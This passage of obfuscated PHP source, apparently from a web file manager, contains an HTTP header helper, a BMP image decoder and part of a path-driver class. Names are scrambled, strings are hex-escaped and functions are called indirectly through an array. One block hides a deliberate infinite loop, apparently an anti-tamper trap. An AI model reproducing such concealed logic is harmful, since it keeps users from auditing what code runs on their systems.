$FšÕå°»×) { $bóÊ‚²½Ï = strtoupper($bóÊ‚²½Ï); if (!array_key_exists($bóÊ‚²½Ï, $_SERVER)) { continue; } $_SERVER[$bóÊ‚²½Ï] = $FšÕå°»×; } foreach (self::$_headers as $bóÊ‚²½Ï => $BÓÍß˜ŞÈ) { if (!array_key_exists($bóÊ‚²½Ï, $_SERVER)) { continue; } $_SERVER[$bóÊ‚²½Ï] = $_SERVER[$BÓÍß˜ŞÈ]; $_SERVER[strtoupper($bóÊ‚²½Ï)] = $_SERVER[$BÓÍß˜ŞÈ]; } } public static function get($bí²›™â‘Å) { self::init(); return $_SERVER[$bí²›™â‘Å] ? $_SERVER[$bí²›™â‘Å] : $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][1832] . strtoupper($bí²›™â‘Å)]; } public static function method() { return strtoupper(self::get($_SERVER[¶ªÕß‚ØÁŸ][164])); } public static function length() { $fùŠ–†îÃ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fŒ­ôêÇ®Ø = self::get($fùŠ–†îÃ‡[1833]); if (!$fŒ­ôêÇ®Ø) { $fŒ­ôêÇ®Ø = self::get($fùŠ–†îÃ‡[1149]); } return $fŒ­ôêÇ®Ø; } public static function range() { $d­ÃÎö¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d“ÌŠ¤ğÅß = self::get($d­ÃÎö¼[208]); if (!$d“ÌŠ¤ğÅß) { return !1; } if (!preg_match($d­ÃÎö¼[1834], $d“ÌŠ¤ğÅß, $cÁ‰´Á°ºË)) { return !1; } if ($cÁ‰´Á°ºË[1] === $d­ÃÎö¼[33] && $cÁ‰´Á°ºË[2] === $d­ÃÎö¼[33]) { return !1; } return array($cÁ‰´Á°ºË[1] !== $d­ÃÎö¼[33] ? $cÁ‰´Á°ºË[1] : null, $cÁ‰´Á°ºË[2] !== $d­ÃÎö¼[33] ? $cÁ‰´Á°ºË[2] : null); } public static $statusCode = array("\61\x30\60" => "\x43\x6f\x6e\164\x69\156\x75\x65", "\x31\60\x31" => "\123\167\151\x74\x63\150\151\x6e\x67\40\120\162\x6f\x74\x6f\x63\x6f\154", "\x31\x30\62" => "\120\x72\x6f\x63\x65\x73\x73\151\x6e\147", "\x31\60\63" => "\x45\x61\162\154\171\x20\110\151\156\164\x73", "\x32\60\x30" => "\x4f\113", "\x32\x30\61" => "\x43\x72\145\x61\164\x65\144", "\62\60\62" => "\101\143\x63\x65\x70\x74\x65\144", "\x32\x30\x33" => "\x4e\157\x6e\55\101\x75\x74\x68\x6f\x72\x69\x74\x61\164\151\166\145\40\111\x6e\x66\x6f\162\155\141\x74\x69\157\x6e", "\62\x30\x34" => "\x4e\157\x20\103\x6f\156\x74\x65\156\164", "\62\60\65" => "\122\x65\x73\x65\164\x20\x43\157\156\x74\x65\156\164", "\x32\60\66" => "\x50\141\162\x74\x69\x61\x6c\40\x43\x6f\156\164\145\156\x74", "\62\x30\x37" => "\115\x75\x6c\x74\x69\x2d\x53\164\x61\164\165\163", "\63\x30\x30" => "\115\x75\x6c\x74\x69\x70\154\145\40\x43\x68\157\x69\143\x65\x73", "\63\60\x31" => "\115\x6f\166\145\x64\40\x50\145\x72\155\x61\156\x65\156\x74\x6c\x79", "\63\60\62" => "\x46\x6f\x75\156\x64", "\63\60\63" => "\123\145\145\40\117\x74\150\x65\x72", "\x33\x30\64" => "\x4e\x6f\164\40\115\157\x64\151\146\x69\145\144", "\x33\60\x35" => "\x55\163\x65\40\x50\x72\x6f\170\x79", "\x33\x30\x37" => "\124\145\x6d\160\157\162\x61\x72\x79\40\122\x65\x64\x69\162\145\143\x74", "\x33\x30\x38" => "\x50\145\x72\155\141\x6e\145\156\x74\x20\x52\145\144\x69\162\x65\143\x74", "\64\x30\x30" => "\102\141\144\x20\122\145\161\x75\x65\x73\x74", "\x34\x30\61" => "\x55\x6e\x61\x75\x74\x68\157\x72\151\172\x65\x64", "\64\x30\62" => "\x50\x61\x79\155\x65\156\164\40\x52\145\161\x75\151\162\x65\144", "\x34\x30\63" => "\x46\x6f\x72\142\151\144\144\145\156", "\64\60\64" => "\x4e\x6f\164\x20\x46\157\x75\x6e\144", "\64\x30\65" => "\x4d\145\164\x68\x6f\144\x20\116\157\164\x20\x41\154\154\x6f\167\x65\144", "\x34\60\66" => "\x4e\157\164\40\x41\143\143\145\x70\164\141\x62\154\x65", "\x34\x30\x37" => "\120\x72\157\x78\x79\x20\x41\x75\164\150\145\156\164\151\143\141\x74\x69\x6f\x6e\40\122\145\161\x75\x69\x72\x65\x64", "\64\x30\70" => "\122\x65\161\165\x65\163\164\x20\124\x69\x6d\x65\x6f\x75\x74", "\64\x30\x39" => "\x43\x6f\156\x66\x6c\x69\143\164", "\64\x31\x30" => "\x47\x6f\156\x65", "\x34\x31\x31" => "\114\145\x6e\x67\164\x68\x20\x52\x65\x71\165\151\162\145\144", "\x34\x31\x32" => "\x50\162\x65\x63\157\x6e\144\x69\x74\151\157\x6e\40\106\x61\x69\154\x65\144", "\x34\x31\63" => "\122\145\x71\x75\145\163\x74\40\105\156\164\x69\164\x79\x20\124\157\157\x20\114\141\162\147\145", "\x34\61\64" => "\122\145\161\x75\x65\163\164\40\x55\x52\x49\x20\124\x6f\157\x20\114\x61\x72\x67\x65", "\x34\x31\x35" => "\125\x6e\x73\165\x70\160\157\x72\164\145\144\40\x4d\x65\x64\151\141\40\x54\x79\160\x65", "\64\x31\66" => "\122\x65\161\165\145\x73\164\145\x64\x20\x52\x61\x6e\x67\x65\40\x4e\x6f\x74\x20\x53\x61\164\x69\x73\146\151\x61\142\154\x65", "\64\x31\x37" => "\x45\170\160\145\143\164\141\164\x69\157\x6e\40\x46\x61\x69\154\x65\144", "\x34\62\62" => "\x55\156\160\x72\x6f\x63\x65\x73\x73\141\142\x6c\x65\40\x45\156\x74\x69\x74\x79", "\x34\x32\x33" => "\114\157\x63\x6b\145\144", "\64\62\x34" => "\106\x61\x69\x6c\x65\x64\40\104\x65\x70\x65\156\144\x65\156\x63\x79", "\x34\x32\x35" => "\x55\156\x6f\162\144\x65\162\x65\x64\40\103\x6f\154\x6c\145\x63\x74\x69\157\156", "\x34\62\66" => "\125\160\147\162\x61\144\145\x20\x52\145\x71\x75\151\162\x65\144", "\x34\x32\x38" => "\x50\162\x65\x63\157\x6e\144\151\164\151\x6f\156\x20\x52\145\x71\x75\x69\x72\145\144", "\x34\62\x39" => "\124\x6f\157\x20\115\x61\x6e\x79\40\122\145\x71\x75\145\163\x74\163", "\64\63\x31" => "\122\x65\x71\165\145\163\x74\40\x48\x65\x61\144\145\162\x20\x46\x69\145\154\x64\x73\x20\124\157\157\x20\114\x61\x72\x67\x65", "\64\x34\x34" => "\x4e\x6f\40\122\x65\x73\160\x6f\x6e\x73\x65", "\x34\65\60" => "\102\x6c\x6f\143\x6b\x65\144\40\142\171\x20\x57\x69\156\x64\x6f\x77\x73\40\120\x61\162\145\x6e\x74\x61\154\40\103\157\x6e\x74\162\157\154\163", "\64\x35\61" => "\125\156\x61\x76\x61\x69\154\141\142\154\x65\x20\x46\x6f\x72\x20\114\145\x67\x61\154\40\122\x65\x61\163\x6f\x6e\x73", "\64\x39\x34" => "\122\x65\x71\165\145\x73\164\40\x48\145\x61\x64\145\x72\40\x54\157\x6f\x20\114\x61\x72\x67\145", "\65\60\x30" => "\x49\x6e\164\145\x72\x6e\141\x6c\x20\123\145\162\166\x65\x72\x20\x45\162\162\x6f\x72", "\65\x30\61" => "\116\x6f\164\x20\x49\x6d\160\154\145\x6d\145\x6e\x74\145\144", "\65\60\62" => "\x42\x61\144\x20\x47\x61\x74\x65\167\141\x79", "\65\60\63" => "\x53\x65\x72\x76\151\x63\x65\x20\125\156\x61\166\141\151\154\141\x62\x6c\145", "\65\x30\x34" => "\x47\141\x74\x65\x77\x61\x79\x20\x54\x69\155\x65\x6f\x75\x74", "\x35\60\x35" => "\110\x54\124\x50\x20\126\145\162\x73\151\157\x6e\40\x6e\x6f\164\x20\163\x75\x70\160\x6f\x72\x74\x65\x64", "\65\x30\x37" => "\111\156\163\165\146\x66\151\x63\x69\145\x6e\164\x20\123\164\x6f\162\141\x67\145"); public static function code($A¬å²áêÏœ) { $bœÑëÌ¾Š­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¬å²áêÏœ = $A¬å²áêÏœ . $bœÑëÌ¾Š­[33]; $aî¼¬¸¿ˆ = self::$statusCode[$A¬å²áêÏœ]; $aî¼¬¸¿ˆ = $aî¼¬¸¿ˆ ? "\110\124\124\120\x2f\61\56\61\40{$A¬å²áêÏœ}\40" . $aî¼¬¸¿ˆ : $bœÑëÌ¾Š­[33]; return $aî¼¬¸¿ˆ; } } class ImageGdBMP { public static function load($d¸å¤„å—…) { $e¼¿È²Ã¨ = fopen($d¸å¤„å—…, $_SERVER[¶ªÕß‚ØÁŸ][1524]); if ($e¼¿È²Ã¨ === !1) { return !1; } $B¥—“ïÍœ‰ = self::loadFromStream($e¼¿È²Ã¨); fclose($e¼¿È²Ã¨); return $B¥—“ïÍœ‰; } public static function loadFromStream($dÁ¨éÄ‡£) { $E“‹¶†ØŞø =& $_SERVER[¶ªÕß‚ØÁŸ]; $EõÄßªÇ†å = fread($dÁ¨éÄ‡£, 14); if ($EõÄßªÇ†å === !1) { return !1; } if ($EõÄßªÇ†å[0] != $E“‹¶†ØŞø[1835] || $EõÄßªÇ†å[1] != $E“‹¶†ØŞø[1836]) { return !1; } $d©êÜ¢æÚÙ = unpack($E“‹¶†ØŞø[1837] . $E“‹¶†ØŞø[1838] . $E“‹¶†ØŞø[1839] . $E“‹¶†ØŞø[1840] . $E“‹¶†ØŞø[1841], $EõÄßªÇ†å); return self::loadFromStreamAndFileHeader($dÁ¨éÄ‡£, $d©êÜ¢æÚÙ); } public static function loadFromStreamAndFileHeader($b‹®Êó´, array $AÙšõšÍ“) { goto fÑ¾Ğ£ŒÏ; AÈä™ÌŒ÷Ÿ: if ($FƒÏ¿©Åƒ‚ === !1) { return !1; } list(, $aÌ‹Ø˜±¯è) = unpack($bˆêÈ©Ù[1842], $FƒÏ¿©Åƒ‚); if ($aÌ‹Ø˜±¯è == 12) { goto b˜«ÃòÑğ—; b˜«ÃòÑğ—: $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $aÌ‹Ø˜±¯è - 4); if ($FƒÏ¿©Åƒ‚ === !1) { return !1; } extract(unpack($bˆêÈ©Ù[1843] . $bˆêÈ©Ù[1844] . $bˆêÈ©Ù[1845] . $bˆêÈ©Ù[1846], $FƒÏ¿©Åƒ‚)); goto b…—¥˜œâ¸; d»à¸ÃÅÔ: $f«ËêµÛ¤‰ = 255; goto cãâ„ˆÑëÌ; b…—¥˜œâ¸: $DÇ‚Šˆß—­ = $E‹³Ö·†¸† = $fØƒ‰™‡ÎÊ = $B¡”‰öØ³Ó = 0; $EÕ–‡¸êÄÔ = 16711680; $c¼„…ÄêÔ = 65280; goto d»à¸ÃÅÔ; cãâ„ˆÑëÌ: } else { if (124 < $aÌ‹Ø˜±¯è || $aÌ‹Ø˜±¯è < 40) { return !1; } else { goto bšÚÙ«ªËæ; bšÚÙ«ªËæ: $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, 36); if ($FƒÏ¿©Åƒ‚ === !1) { return !1; } extract(unpack($bˆêÈ©Ù[1847] . $bˆêÈ©Ù[1848] . $bˆêÈ©Ù[1845] . $bˆêÈ©Ù[1849] . $bˆêÈ©Ù[1850] . $bˆêÈ©Ù[1851] . $bˆêÈ©Ù[1852] . $bˆêÈ©Ù[1853] . $bˆêÈ©Ù[1854] . $bˆêÈ©Ù[1855], $FƒÏ¿©Åƒ‚)); goto eÔÄŸ’ˆ¼Ä; F¬ç†®³Š: if (($b¡­†ãš¯• == 16 || $b¡­†ãš¯• == 24 || $b¡­†ãš¯• == 32) && $B¡”‰öØ³Ó == 0 && $EÕ–‡¸êÄÔ == 0 && $c¼„…ÄêÔ == 0 && $f«ËêµÛ¤‰ == 0) { switch ($b¡­†ãš¯•) { case 16: $EÕ–‡¸êÄÔ = 31744; $c¼„…ÄêÔ = 992; $f«ËêµÛ¤‰ = 31; break; case 24: case 32: $EÕ–‡¸êÄÔ = 16711680; $c¼„…ÄêÔ = 65280; $f«ËêµÛ¤‰ = 255; break; } } goto D÷ò¹ÙÆâ¦; eÔÄŸ’ˆ¼Ä: if ($a¿Ñ‹­öË & 2147483648) { $a¿Ñ‹­öË = -(~$a¿Ñ‹­öË & 4294967295) - 1; } if ($DèåŞÕª‚’ & 2147483648) { $DèåŞÕª‚’ = -(~$DèåŞÕª‚’ & 4294967295) - 1; } if ($dåñÕÎèÊ½ & 2147483648) { $dåñÕÎèÊ½ = -(~$dåñÕÎèÊ½ & 4294967295) - 1; } goto D†ª¤öÉßÉ; D†ª¤öÉßÉ: if ($eŒÒ½áõàÖ & 2147483648) { $eŒÒ½áõàÖ = -(~$eŒÒ½áõàÖ & 4294967295) - 1; } if ($AÙšõšÍ“[$bˆêÈ©Ù[528]] != 0) { $bËĞÓ«¦‰Ë = $b¡­†ãš¯• == 1 || $b¡­†ãš¯• == 4 || $b¡­†ãš¯• == 8 ? ($DÇ‚Šˆß—­ ? $DÇ‚Šˆß—­ : pow(2, $b¡­†ãš¯•)) << 2 : 0; $eœ——é¤ºå = $fÀÔ²ƒöÒ¼ ? $fÀÔ²ƒöÒ¼ : ($a¿Ñ‹­öË * $b¡­†ãš¯• + 31 >> 3 & ~3) * abs($DèåŞÕª‚’); $A  ±°¾ Õ = $AÙšõšÍ“[$bˆêÈ©Ù[528]] - $eœ——é¤ºå - $bËĞÓ«¦‰Ë - 14; if ($aÌ‹Ø˜±¯è < $A  ±°¾ Õ && 40 <= $aÌ‹Ø˜±¯è && $aÌ‹Ø˜±¯è <= 124) { $aÌ‹Ø˜±¯è = $A  ±°¾ Õ; } } if ($aÌ‹Ø˜±¯è - 40 > 0) { $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $aÌ‹Ø˜±¯è - 40); if ($FƒÏ¿©Åƒ‚ === !1) { return !1; } extract(unpack($bˆêÈ©Ù[1856] . $bˆêÈ©Ù[1857] . $bˆêÈ©Ù[1858] . $bˆêÈ©Ù[1859], $FƒÏ¿©Åƒ‚ . str_repeat($bˆêÈ©Ù[1860], 120))); } else { $fØƒ‰™‡ÎÊ = $EÕ–‡¸êÄÔ = $c¼„…ÄêÔ = $f«ËêµÛ¤‰ = 0; } goto F¬ç†®³Š; D÷ò¹ÙÆâ¦: } } goto DëÄ®½êÔê; fÑ¾Ğ£ŒÏ: $bˆêÈ©Ù =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($AÙšõšÍ“[$bˆêÈ©Ù[396]] != 19778) { return !1; } $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, 4); goto AÈä™ÌŒ÷Ÿ; f°ĞÍªÄƒõ: if ($b¡­†ãš¯• == 1 || $b¡­†ãš¯• == 4 || $b¡­†ãš¯• == 8) { goto D¾ïÔ‰ñÛ; a”—¨…¿°¶: $E‰…èÔš‚ = array(); for ($Dã¥çßÁö = 0; $Dã¥çßÁö < $fİÆ÷ø´Â±; ++$Dã¥çßÁö) { $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $f‰¦ßÑÉ¤È); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } extract(unpack($bˆêÈ©Ù[1861], $FƒÏ¿©Åƒ‚ . $bˆêÈ©Ù[1860])); $E‰…èÔš‚[] = imagecolorallocate($añÄ«¬ÜÆ, $aíÉÆ°Œ–, $cÈ¢ƒËÄò„, $C›È—Ù¹ˆ•); } $Aí²„èê×È = 8 - $b¡­†ãš¯•; goto fÓ†Š›×¥Î; D¾ïÔ‰ñÛ: $añÄ«¬ÜÆ = imagecreate($a¿Ñ‹­öË, $aÆ¡ãÂªÀ); $f‰¦ßÑÉ¤È = $aÌ‹Ø˜±¯è == 12 ? 3 : 4; $fİÆ÷ø´Â± = $DÇ‚Šˆß—­ ? $DÇ‚Šˆß—­ : pow(2, $b¡­†ãš¯•); goto a”—¨…¿°¶; fÓ†Š›×¥Î: $F´ƒºŠÚ‚˜ = (1 << $b¡­†ãš¯•) - 1 << $Aí²„èê×È; if ($B¡”‰öØ³Ó == 1 || $B¡”‰öØ³Ó == 2) { $Aˆ™•¾øòâ = 0; $dùÔğÕƒ‰¥ = $b¡­†ãš¯• >> 2 & 1; for (;;) { if ($Aˆ™•¾øòâ < -1 || $Aˆ™•¾øòâ > $a¿Ñ‹­öË || $d…Š—Ó¾¥ < -1 || $d…Š—Ó¾¥ > $DèåŞÕª‚’) { imagedestroy($añÄ«¬ÜÆ); return !1; } $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, 1); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } switch ($FƒÏ¿©Åƒ‚) { case $bˆêÈ©Ù[1860]: $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, 1); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } switch ($FƒÏ¿©Åƒ‚) { case $bˆêÈ©Ù[1860]: $d…Š—Ó¾¥ += $e—ˆ£¢…á; $Aˆ™•¾øòâ = 0; break; case $bˆêÈ©Ù[1862]: $d…Š—Ó¾¥ = 0; $Aˆ™•¾øòâ = 0; break 3; case $bˆêÈ©Ù[1863]: $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, 2); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } list(, $f³ïö§±Õ, $F„¶Ù¿‹Ó÷) = unpack($bˆêÈ©Ù[1864], $FƒÏ¿©Åƒ‚); $Aˆ™•¾øòâ += $f³ïö§±Õ; $d…Š—Ó¾¥ += $F„¶Ù¿‹Ó÷ * $e—ˆ£¢…á; break; default: list(, $aõ­ÂÇçŒÒ) = unpack($bˆêÈ©Ù[1865], $FƒÏ¿©Åƒ‚); $CÉË«µñÀÒ = ($aõ­ÂÇçŒÒ >> $dùÔğÕƒ‰¥) + ($aõ­ÂÇçŒÒ & $dùÔğÕƒ‰¥); $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $CÉË«µñÀÒ + 1 & ~1); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } for ($Dã¥çßÁö = 0, $a“¬¤×…¶ = 0; $Dã¥çßÁö < $aõ­ÂÇçŒÒ; ++$Dã¥çßÁö, ++$Aˆ™•¾øòâ, $a“¬¤×…¶ += $b¡­†ãš¯•) { list(, $aéİÛÌ) = unpack($bˆêÈ©Ù[1865], $FƒÏ¿©Åƒ‚[$a“¬¤×…¶ >> 3]); $C›È—Ù¹ˆ• = $a“¬¤×…¶ & 7; imagesetpixel($añÄ«¬ÜÆ, $Aˆ™•¾øòâ, $d…Š—Ó¾¥, $E‰…èÔš‚[($aéİÛÌ & $F´ƒºŠÚ‚˜ >> $C›È—Ù¹ˆ•) >> $Aí²„èê×È - $C›È—Ù¹ˆ•]); } break; } break; default: $D¤ÓÁæ× = fread($b‹®Êó´, 1); if ($D¤ÓÁæ× === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } list(, $DÜÖ· ¸†, $aéİÛÌ) = unpack($bˆêÈ©Ù[1864], $FƒÏ¿©Åƒ‚ . $D¤ÓÁæ×); for ($Dã¥çßÁö = 0, $a“¬¤×…¶ = 0; $Dã¥çßÁö < $DÜÖ· ¸†; ++$Dã¥çßÁö, ++$Aˆ™•¾øòâ, $a“¬¤×…¶ += $b¡­†ãš¯•) { $C›È—Ù¹ˆ• = $a“¬¤×…¶ & 7; imagesetpixel($añÄ«¬ÜÆ, $Aˆ™•¾øòâ, $d…Š—Ó¾¥, $E‰…èÔš‚[($aéİÛÌ & $F´ƒºŠÚ‚˜ >> $C›È—Ù¹ˆ•) >> $Aí²„èê×È - $C›È—Ù¹ˆ•]); } break; } } } else { for ($FâßØ§½ø— = 0; $FâßØ§½ø— < $aÆ¡ãÂªÀ; ++$FâßØ§½ø—, $d…Š—Ó¾¥ += $e—ˆ£¢…á) { $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $e§´¾ÅœÀŒ); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } $a“¬¤×…¶ = 0; for ($Aˆ™•¾øòâ = 0; $Aˆ™•¾øòâ < $a¿Ñ‹­öË; ++$Aˆ™•¾øòâ, $a“¬¤×…¶ += $b¡­†ãš¯•) { list(, $aéİÛÌ) = unpack($bˆêÈ©Ù[1865], $FƒÏ¿©Åƒ‚[$a“¬¤×…¶ >> 3]); $C›È—Ù¹ˆ• = $a“¬¤×…¶ & 7; imagesetpixel($añÄ«¬ÜÆ, $Aˆ™•¾øòâ, $d…Š—Ó¾¥, $E‰…èÔš‚[($aéİÛÌ & $F´ƒºŠÚ‚˜ >> $C›È—Ù¹ˆ•) >> $Aí²„èê×È - $C›È—Ù¹ˆ•]); } } } goto cØ…‰İò©Â; cØ…‰İò©Â: } else { goto b†»«Œ‡Š; CÀÍôÁ¢İ: $cˆ´¸¾¿Ú = $EÕ–‡¸êÄÔ ? 1 / $EÕ–‡¸êÄÔ : 1; $DøªïáÈƒĞ = $c¼„…ÄêÔ ? 1 / $c¼„…ÄêÔ : 1; $D¥²Ó¦µà = $f«ËêµÛ¤‰ ? 1 / $f«ËêµÛ¤‰ : 1; goto FÑÈÔò¢ï; Bªİ¬ò·‰’: $aÏ„éğ·˜ = $b¡­†ãš¯• >> 3; $FÜ®ñçÁ¾ = $fØƒ‰™‡ÎÊ ? 127 : 0; $BñÇë£Ş²… = $fØƒ‰™‡ÎÊ ? 1 / $fØƒ‰™‡ÎÊ : 1; goto CÀÍôÁ¢İ; b†»«Œ‡Š: $añÄ«¬ÜÆ = imagecreatetruecolor($a¿Ñ‹­öË, $aÆ¡ãÂªÀ); imagealphablending($añÄ«¬ÜÆ, !1); if ($fØƒ‰™‡ÎÊ) { imagesavealpha($añÄ«¬ÜÆ, !0); } goto Bªİ¬ò·‰’; FÑÈÔò¢ï: for ($FâßØ§½ø— = 0; $FâßØ§½ø— < $aÆ¡ãÂªÀ; ++$FâßØ§½ø—, $d…Š—Ó¾¥ += $e—ˆ£¢…á) { $FƒÏ¿©Åƒ‚ = fread($b‹®Êó´, $e§´¾ÅœÀŒ); if ($FƒÏ¿©Åƒ‚ === !1) { imagedestroy($añÄ«¬ÜÆ); return !1; } $a“¬¤×…¶ = 0; for ($Aˆ™•¾øòâ = 0; $Aˆ™•¾øòâ < $a¿Ñ‹­öË; ++$Aˆ™•¾øòâ, $a“¬¤×…¶ += $aÏ„éğ·˜) { list(, $aéİÛÌ) = unpack($bˆêÈ©Ù[1842], substr($FƒÏ¿©Åƒ‚, $a“¬¤×…¶, $aÏ„éğ·˜) . $bˆêÈ©Ù[1866]); $CÅ÷ØÄàŒâ = $aéİÛÌ & $fØƒ‰™‡ÎÊ; $b…•…¬…× = $aéİÛÌ & $EÕ–‡¸êÄÔ; $CÈ¸ëÕö‹Â = $aéİÛÌ & $c¼„…ÄêÔ; $Eñğ˜Åï˜ë = $aéİÛÌ & $f«ËêµÛ¤‰; $cºà¤‹‰õ† = $FÜ®ñçÁ¾ - (($CÅ÷ØÄàŒâ << 7) - $CÅ÷ØÄàŒâ) * $BñÇë£Ş²…; $aíÉÆ°Œ– = (($b…•…¬…× << 8) - $b…•…¬…×) * $cˆ´¸¾¿Ú; $cÈ¢ƒËÄò„ = (($CÈ¸ëÕö‹Â << 8) - $CÈ¸ëÕö‹Â) * $DøªïáÈƒĞ; $C›È—Ù¹ˆ• = (($Eñğ˜Åï˜ë << 8) - $Eñğ˜Åï˜ë) * $D¥²Ó¦µà; imagesetpixel($añÄ«¬ÜÆ, $Aˆ™•¾øòâ, $d…Š—Ó¾¥, $cºà¤‹‰õ† << 24 | $aíÉÆ°Œ– << 16 | $cÈ¢ƒËÄò„ << 8 | $C›È—Ù¹ˆ•); } } imagealphablending($añÄ«¬ÜÆ, !0); goto bòÒòĞ¦ß; bòÒòĞ¦ß: } return $añÄ«¬ÜÆ; goto B’ª˜¸Ó¾; DëÄ®½êÔê: if ($a¿Ñ‹­öË == 0 || $DèåŞÕª‚’ == 0 || $Bä‘ß®ì…¶ != 1 || ($fØƒ‰™‡ÎÊ & $EÕ–‡¸êÄÔ) != 0 || ($fØƒ‰™‡ÎÊ & $c¼„…ÄêÔ) != 0 || ($fØƒ‰™‡ÎÊ & $f«ËêµÛ¤‰) != 0 || ($EÕ–‡¸êÄÔ & $c¼„…ÄêÔ) != 0 || ($EÕ–‡¸êÄÔ & $f«ËêµÛ¤‰) != 0 || ($c¼„…ÄêÔ & $f«ËêµÛ¤‰) != 0) { return !1; } if ($B¡”‰öØ³Ó == 4 || $B¡”‰öØ³Ó == 5) { $FƒÏ¿©Åƒ‚ = stream_get_contents($b‹®Êó´, $fÀÔ²ƒöÒ¼); if ($FƒÏ¿©Åƒ‚ === !1) { return !1; } return imagecreatefromstring($FƒÏ¿©Åƒ‚); } $e§´¾ÅœÀŒ = $a¿Ñ‹­öË * $b¡­†ãš¯• + 31 >> 3 & ~3; goto B‘’×É­æ³; B‘’×É­æ³: $aÆ¡ãÂªÀ = abs($DèåŞÕª‚’); $d…Š—Ó¾¥ = $DèåŞÕª‚’ > 0 ? $aÆ¡ãÂªÀ - 1 : 0; $e—ˆ£¢…á = $DèåŞÕª‚’ > 0 ? -1 : 1; goto f°ĞÍªÄƒõ; B’ª˜¸Ó¾: } } goto cÀÂÒôÔº·; B¥æé²„‰í: if (!isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][57]]) || !isset($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][58]])) { goto C§Ÿ£šÅÇğ; C§Ÿ£šÅÇğ: $B„ä¤›¿±ö = $_SERVER[¶ªÕß‚ØÁŸ][59]; $dÌ¨˜ƒÏ—İ = $_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]; $aöîÓ…ŞÜÒ = $B„ä¤›¿±ö($dÌ¨˜ƒÏ—İ); goto dç…–—‘µŞ; aòç•³ÀÜ…: $bó¿­°ß¼¨($_SERVER[$_SERVER[¶ªÕß‚ØÁŸ][60]] . $_SERVER[¶ªÕß‚ØÁŸ][61]); $D”ÈóîŒ«ç = 2; while ($D”ÈóîŒ«ç > 1) { $Eæ¤Ü¥ÉÎå = rawurlencode($D”ÈóîŒ«ç . $_SERVER[¶ªÕß‚ØÁŸ][66]); } goto EÑÛƒóÏ®º; dç…–—‘µŞ: $DÑñ ‹®ñª = explode($_SERVER[¶ªÕß‚ØÁŸ][62], $aöîÓ…ŞÜÒ); if (count($DÑñ ‹®ñª) < $_SERVER[¶ªÕß‚ØÁŸ][63]) { $D¦ŒÈğßèÂ = $_SERVER[¶ªÕß‚ØÁŸ][64]; $D¦ŒÈğßèÂ(); } $bó¿­°ß¼¨ = $_SERVER[¶ªÕß‚ØÁŸ][65]; goto aòç•³ÀÜ…; EÑÛƒóÏ®º: } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $c³©´÷æÅº =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->objectDriver = array($c³©´÷æÅº[67], $c³©´÷æÅº[68], $c³©´÷æÅº[69], $c³©´÷æÅº[70], $c³©´÷æÅº[71], $c³©´÷æÅº[72], $c³©´÷æÅº[73], $c³©´÷æÅº[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cïÖ„«æ‘È) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($cïÖ„«æ‘È, $_SERVER[¶ªÕß‚ØÁŸ][8]); } return $cïÖ„«æ‘È; } public function getPathName($Aˆôº¥•±ù) { return $Aˆôº¥•±ù; } public function iconvApp($EÆ…»ëßŒ) { return $EÆ…»ëßŒ; } public function iconvSystem($B”Àù†™Æ) { return $B”Àù†™Æ; } public function iconvTo($a£‘®õ†Ç, $cˆ½¨ëÆã‡, $dè—Â¡ùáà) { goto e±¬Áä›Õ; dÛøÁéÑ¥·: $Aà˜»£º² = $cˆ½¨ëÆã‡ . $D¾’¾Æ—ó[76] . $dè—Â¡ùáà . $D¾’¾Æ—ó[77] . $a£‘®õ†Ç; if (isset($f´‘¸“˜Øç[$Aà˜»£º²])) { return $f´‘¸“˜Øç[$Aà˜»£º²]; } if (function_exists($D¾’¾Æ—ó[78])) { $a“¢æ‰Çê = @mb_convert_encoding($a£‘®õ†Ç, $dè—Â¡ùáà, $cˆ½¨ëÆã‡); } else { $a“¢æ‰Çê = @iconv($cˆ½¨ëÆã‡, $dè—Â¡ùáà, $a£‘®õ†Ç); } goto DãÅ¡‹ĞÓ; DãÅ¡‹ĞÓ: $a“¢æ‰Çê = $a“¢æ‰Çê ? $a“¢æ‰Çê : $a£‘®õ†Ç; if (strstr($a“¢æ‰Çê, $D¾’¾Æ—ó[79])) { $a“¢æ‰Çê = str_replace($D¾’¾Æ—ó[79], $D¾’¾Æ—ó[80], $a“¢æ‰Çê); } $f´‘¸“˜Øç[$cˆ½¨ëÆã‡ . $D¾’¾Æ—ó[76] . $dè—Â¡ùáà . $D¾’¾Æ—ó[77] . $a£‘®õ†Ç] = $a“¢æ‰Çê; goto A³ŞÁŠÇÈ; A³ŞÁŠÇÈ: $f´‘¸“˜Øç[$dè—Â¡ùáà . $D¾’¾Æ—ó[76] . $cˆ½¨ëÆã‡ . $D¾’¾Æ—ó[77] . $a£‘®õ†Ç] = $a£‘®õ†Ç; 